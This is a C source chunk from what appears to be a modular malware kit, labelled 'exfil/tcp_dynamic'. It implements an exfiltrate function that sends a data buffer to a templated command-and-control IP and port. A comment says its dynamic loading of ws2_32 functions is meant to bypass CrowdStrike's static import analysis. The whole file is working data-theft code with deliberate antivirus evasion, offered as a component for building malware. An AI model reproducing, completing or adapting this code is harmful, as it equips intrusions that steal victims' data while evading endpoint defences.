// chunk: exfil/tcp_dynamic
// depends: core/emit_buffer
// provides: exfiltrate
// note: Dynamic ws2_32 loading - bypasses CrowdStrike static import analysis

#ifndef CHUNK_TCP_DYNAMIC
#define CHUNK_TCP_DYNAMIC

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

typedef int (WINAPI *fn_WSAStartup)(WORD, LPVOID);
typedef int (WINAPI *fn_WSACleanup)(void);
typedef UINT_PTR (WINAPI *fn_socket)(int, int, int);
typedef int (WINAPI *fn_connect)(UINT_PTR, const void*, int);
typedef int (WINAPI *fn_send)(UINT_PTR, const char*, int, int);
typedef int (WINAPI *fn_closesocket)(UINT_PTR);

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;

    HMODULE ws = LoadLibraryA("ws2_32.dll");
    if (!ws) return FALSE;

    fn_WSAStartup pWSAStartup = (fn_WSAStartup)GetProcAddress(ws, "WSAStartup");
    fn_socket pSocket = (fn_socket)GetProcAddress(ws, "socket");
    fn_connect pConnect = (fn_connect)GetProcAddress(ws, "connect");
    fn_send pSend = (fn_send)GetProcAddress(ws, "send");
    fn_closesocket pClose = (fn_closesocket)GetProcAddress(ws, "closesocket");
    fn_WSACleanup pCleanup = (fn_WSACleanup)GetProcAddress(ws, "WSACleanup");

    if (!pWSAStartup || !pSocket || !pConnect || !pSend || !pClose || !pCleanup) {
        FreeLibrary(ws);
        return FALSE;
    }

    char wsa[512];
    if (pWSAStartup(0x0202, wsa) != 0) {
        FreeLibrary(ws);
        return FALSE;
    }

    UINT_PTR sock = pSocket(2, 1, 0);
    if (sock == (UINT_PTR)-1) {
        pCleanup();
        FreeLibrary(ws);
        return FALSE;
    }

    // Build sockaddr_in manually to avoid header deps
    unsigned char sa[16] = {0};
    sa[0] = 2;  // AF_INET
    // Port in network byte order
    sa[2] = (unsigned char)((port >> 8) & 0xFF);
    sa[3] = (unsigned char)(port & 0xFF);
    // Parse IP
    int o1, o2, o3, o4;
    if (sscanf(ip, "%d.%d.%d.%d", &o1, &o2, &o3, &o4) == 4) {
        sa[4] = (unsigned char)o1;
        sa[5] = (unsigned char)o2;
        sa[6] = (unsigned char)o3;
        sa[7] = (unsigned char)o4;
    }

    int retries = 3;
    BOOL connected = FALSE;
    while (retries-- > 0 && !connected) {
        if (pConnect(sock, sa, 16) == 0) {
            connected = TRUE;
        } else {
            Sleep(2000);
        }
    }

    if (!connected) {
        pClose(sock);
        pCleanup();
        FreeLibrary(ws);
        return FALSE;
    }

    // Send in chunks
    DWORD sent = 0;
    while (sent < len) {
        DWORD chunk = len - sent;
        if (chunk > 4096) chunk = 4096;
        int n = pSend(sock, data + sent, (int)chunk, 0);
        if (n <= 0) break;
        sent += (DWORD)n;
    }

    pClose(sock);
    pCleanup();
    FreeLibrary(ws);
    return sent == len;
}

#endif
